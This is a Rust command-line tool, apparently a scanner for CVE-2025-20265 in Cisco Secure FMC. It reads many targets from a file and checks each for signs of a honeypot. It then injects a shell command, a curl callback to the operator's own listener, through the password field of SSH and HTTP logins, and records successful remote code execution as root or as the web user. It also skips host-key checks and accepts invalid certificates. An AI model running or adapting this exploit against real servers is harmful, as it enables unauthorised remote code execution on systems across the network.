use std::{collections::HashMap, str::FromStr, sync::Arc, time::Duration};

use anyhow::Result;
use clap::Parser;
use log::{debug, error, info, warn};
use reqwest::{
    Client, Url,
    header::{LOCATION, SERVER},
    redirect::Policy,
};
use russh::{
    client::{Config, Handler},
    keys::ssh_key,
};
use tokio::{
    io::{self, Interest},
    net::{TcpListener, ToSocketAddrs},
    sync::mpsc::Sender,
};
use url::ParseError;

// FIXME: don't use default
const SSH_PORT: u16 = 22;

enum Ty {
    Ssh,
    Www,
    Unexpected,
}

/// Checks if the server is vulnerable to CVE-2025-20265.
#[derive(Debug, Parser)]
struct Cli {
    /// The timeout (in seconds) for idle network request
    #[arg(short, long, default_value_t = 30)]
    timeout: u64,
    /// The port on this system that will be used to check a feedback from the server being checked
    /// (must be added to a firewall exceptions!)
    #[arg(short, long, default_value_t = 8080)]
    port: u16,
    /// The public IP address of this system. If not specified, it will be got via ifconfig.me/ip
    #[arg(short, long)]
    ip: Option<String>,
    /// Read addresses from a file
    #[arg(short, long, default_value_t = false)]
    from_file: bool,
    /// The URL (or address with HTTPS by default) of the server (IPv6 addresses must be given
    /// between [ and ] brackets) or the path to a file with the list of addresses (use
    /// --from-file/-f argument)
    target: String,
}

impl Cli {
    async fn run(self) -> Result<()> {
        let mut targets = Vec::new();
        if self.from_file {
            let text = std::fs::read_to_string(&self.target)?;
            for line in text.lines() {
                match arg_to_url(line) {
                    Ok(u) => targets.push(u),
                    Err(e) => error!("convert `{line}` to URL: {e}"),
                }
            }
        } else {
            targets.push(arg_to_url(&self.target)?);
        }
        debug!("{targets:#?}");
        // TODO: make timeout for server as argument
        let timeout_server = 1;
        let (tx, mut rx) = tokio::sync::mpsc::channel(100);
        tokio::spawn(tcp_listener(
            format!("0.0.0.0:{}", self.port),
            timeout_server,
            tx,
        ));
        let mut rxs = Vec::new();
        let targets_count = targets.len();
        for target in targets {
            let (tx, rx) = tokio::sync::mpsc::channel(2);
            rxs.push(rx);
            let timeout = self.timeout;
            let ip = self.ip.clone();
            tokio::spawn(async move {
                debug!("target: {target}");
                match is_honeypot(&target, timeout).await {
                    Ok(is_h) => {
                        if is_h {
                            warn!("seems {target} is honeypot or not Cisco Secure FMC");
                            return;
                        }
                    }
                    Err(e) => {
                        log_errors(e);
                        tx.send(Err(anyhow::anyhow!("[{target}]: honeypot identification")))
                            .await
                            .ok();
                        return;
                    }
                }
                match get_icon_hash(&target, timeout).await {
                    Ok(hash) => {
                        let ver = match hash.as_str() {
                            "v9186jMMtwM" => "7.7.0",
                            _ => "unknown",
                        };
                        info!("[{target}]: {ver} version");
                    }
                    Err(e) => {
                        log_errors(e);
                    }
                }
                let server_ip = match ip {
                    Some(i) => i.clone(),
                    None => match get_self_public_ip(timeout).await {
                        Ok(i) => i,
                        Err(_) => {
                            tx.send(Err(anyhow::anyhow!("[{target}]: getting public ip")))
                                .await
                                .ok();
                            return;
                        }
                    },
                };
                debug!("{server_ip}");
                match ssh_connect(
                    &target,
                    &format!("'&&curl http://{}:{}/ssh&&echo'", server_ip, self.port),
                    timeout,
                )
                .await
                {
                    Ok(_) => {
                        info!("[{target}]: SSH - OK");
                        tx.send(Ok(target.clone())).await.ok();
                    }
                    Err(_) => {
                        warn!(
                            "[{target}]: couldn't connect via SSH (exploiting vulnerability via root user is not available)"
                        );
                        tx.send(Err(anyhow::anyhow!("[{target}]: SSH"))).await.ok();
                    }
                }
                match http_connect(
                    &target,
                    &format!("'&&curl http://{}:{}/http&&echo'", server_ip, self.port),
                    timeout,
                )
                .await
                {
                    Ok(_) => {
                        info!("[{target}]: HTTP(S) - OK");
                        tx.send(Ok(target.clone())).await.ok();
                    }
                    Err(e) => {
                        log_errors(e);
                        tx.send(Err(anyhow::anyhow!("[{target}]: HTTP"))).await.ok();
                    }
                }
            });
        }
        let mut count = 0;
        for rx in &mut rxs {
            while (rx.recv().await).is_some() {
                count += 1;
            }
        }
        let mut ssh = 0;
        let mut www = 0;
        let mut unexpected = 0;
        while let Ok(ty) = tokio::time::timeout(Duration::from_secs(self.timeout), rx.recv()).await
        {
            let ty = ty.unwrap();
            match ty {
                Ty::Ssh => ssh += 1,
                Ty::Www => www += 1,
                Ty::Unexpected => unexpected += 1,
            }
            count -= 1;
            if count < 1 {
                break;
            }
        }
        info!("targets: {targets_count}\nRCE:\n\tvia www: {www}\n\tvia root: {ssh}");
        if unexpected != 0 {
            warn!("unexpected answers: {unexpected}");
        }
        Ok(())
    }
}

// TODO: add more checks?
async fn is_honeypot(url: &Url, timeout: u64) -> Result<bool> {
    let mut url = url.clone();
    let client = make_client(timeout)?;
    let index_resp = client.get(url.clone()).send().await?;
    // should redirect to /ui/login
    if !index_resp.status().is_redirection() {
        debug!("{url}: not redirection");
        return Ok(true);
    }
    if index_resp
        .headers()
        .get(LOCATION)
        .and_then(|l| l.to_str().ok())
        .is_none_or(|l| l != "/ui/login")
    {
        debug!("{url}: redirection is not /ui/login");
        return Ok(true);
    }

    // /ui/login should have header `Server: Mojolicious (Perl)`
    url.set_path("/ui/login");
    let ui_login_resp = client.get(url.clone()).send().await?;
    if !ui_login_resp.status().is_success() {
        debug!("{url}: return not success status");
        return Ok(true);
    }
    if ui_login_resp
        .headers()
        .get(SERVER)
        .and_then(|s| s.to_str().ok())
        .is_none_or(|s| s != "Mojolicious (Perl)")
    {
        debug!("{url}: server is not 'Mojolicious (Perl)'");
        return Ok(true);
    }

    // /login.cgi should have Cisco copyright
    url.set_path("/login.cgi");
    let index_cgi_resp = client.get(url.clone()).send().await?;
    if !index_cgi_resp.status().is_success() {
        debug!("{url}: return not success status");
        return Ok(true);
    }
    let index_cgi_body = index_cgi_resp.text().await?;
    let copyright = "Copyright";
    if !index_cgi_body.contains(copyright) || !index_cgi_body.contains("Cisco") {
        debug!("{url}: doesn't have Cisco copyright");
        return Ok(true);
    }
    let i = index_cgi_body.find(copyright).unwrap() + copyright.len() + 1;
    let years = index_cgi_body.get(i..i + "2004-2025".len());
    if years.is_none() {
        debug!("{url}: can't find copyright's years");
        return Ok(true);
    }
    debug!("{url}: {}", years.unwrap());

    Ok(false)
}

async fn get_icon_hash(url: &Url, timeout: u64) -> Result<String> {
    let mut url = url.clone();
    url.set_path("/ui/login");
    let client = make_client(timeout)?;
    let text = client.get(url).send().await?.text().await?;
    let pattern = "cisco-icon.svg?v=";
    const HASH_LEN: usize = 11;
    let i = match text.find(pattern).map(|i| i + pattern.len()) {
        Some(i) => i,
        None => anyhow::bail!("can't find cisco-icon pattern"),
    };
    let hash_str = text
        .get(i..i + HASH_LEN)
        .ok_or_else(|| anyhow::anyhow!("can't get hash for cisco-icon"))?;
    Ok(hash_str.to_string())
}

async fn ssh_connect(url: &Url, password: &str, timeout: u64) -> Result<()> {
    let config = Arc::new(Config::default());
    let url = format!("{}:{SSH_PORT}", url.host_str().unwrap());
    debug!("ssh url: {url}");
    let mut session = tokio::time::timeout(
        Duration::from_secs(timeout),
        russh::client::connect(config, url, SshClient {}),
    )
    .await??;
    session.authenticate_password("user", password).await?;
    Ok(())
}

async fn http_connect(url: &Url, password: &str, timeout: u64) -> Result<()> {
    let mut url = url.clone();
    url.set_path("/auth/login");
    let client = make_client(timeout)?;
    let mut params = HashMap::new();
    params.insert("username", "user");
    params.insert("password", password);
    let resp = client.post(url).form(&params).send().await?;
    debug!("{:?}", resp.text().await);
    Ok(())
}

async fn get_self_public_ip(timeout: u64) -> Result<String> {
    let client = make_client(timeout)?;
    Ok(client
        .get("https://ifconfig.me/ip")
        .send()
        .await?
        .text()
        .await?)
}

async fn tcp_listener<A>(address: A, timeout: u64, tx: Sender<Ty>) -> Result<()>
where
    A: ToSocketAddrs,
{
    let listener = TcpListener::bind(address).await?;
    loop {
        if let Ok(s) = tokio::time::timeout(Duration::from_secs(timeout), listener.accept()).await {
            let socket = match s {
                Ok(s) => s.0,
                Err(e) => {
                    log_errors(e.into());
                    continue;
                }
            };
            let addr = match socket.peer_addr() {
                Ok(a) => a.ip(),
                Err(e) => {
                    log_errors(e.into());
                    continue;
                }
            };
            debug!("peer: {addr}");
            let ready = match socket.ready(Interest::READABLE).await {
                Ok(r) => r,
                Err(e) => {
                    log_errors(e.into());
                    continue;
                }
            };

            if ready.is_readable() {
                let mut data = vec![0; 80];
                match socket.try_read(&mut data) {
                    Ok(_) => {
                        let response = String::from_utf8_lossy(&data);
                        debug!("[{addr}]: {response}");
                        if response.contains("ssh") {
                            info!("[{addr}]: RCE via root user");
                            tx.send(Ty::Ssh).await.unwrap();
                        } else if response.contains("http") {
                            info!("[{addr}]: RCE via www user");
                            tx.send(Ty::Www).await.unwrap();
                        } else {
                            warn!("[{addr}]: unexpected answer");
                            tx.send(Ty::Unexpected).await.unwrap();
                        }
                    }
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                        continue;
                    }
                    Err(e) => {
                        log_errors(e.into());
                        continue;
                    }
                }
            }
        }
    }
}

struct SshClient {}

impl Handler for SshClient {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _server_public_key: &ssh_key::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

fn make_client(timeout: u64) -> Result<Client> {
    Ok(reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(Policy::none())
        .danger_accept_invalid_certs(true)
        .build()?)
}

fn arg_to_url(arg: &str) -> Result<Url> {
    match Url::from_str(arg) {
        Ok(u) => Ok(u),
        Err(e) => {
            if e == ParseError::RelativeUrlWithoutBase {
                let url = format!("https://{arg}");
                warn!("URL without a protocol, using HTTPS by default: {url}");
                match Url::from_str(&url) {
                    Ok(u) => Ok(u),
                    Err(e) => Err(e.into()),
                }
            } else {
                Err(e.into())
            }
        }
    }
}

#[tokio::main(flavor = "current_thread")]
async fn main() {
    colog::default_builder().init();

    if let Err(e) = Cli::parse().run().await {
        log_errors(e);
    }
}

fn log_errors(e: anyhow::Error) {
    let mut errors = String::new();
    for cause in e.chain() {
        errors.push_str(&format!("{cause}\n"));
    }
    error!("{}", errors.trim());
}
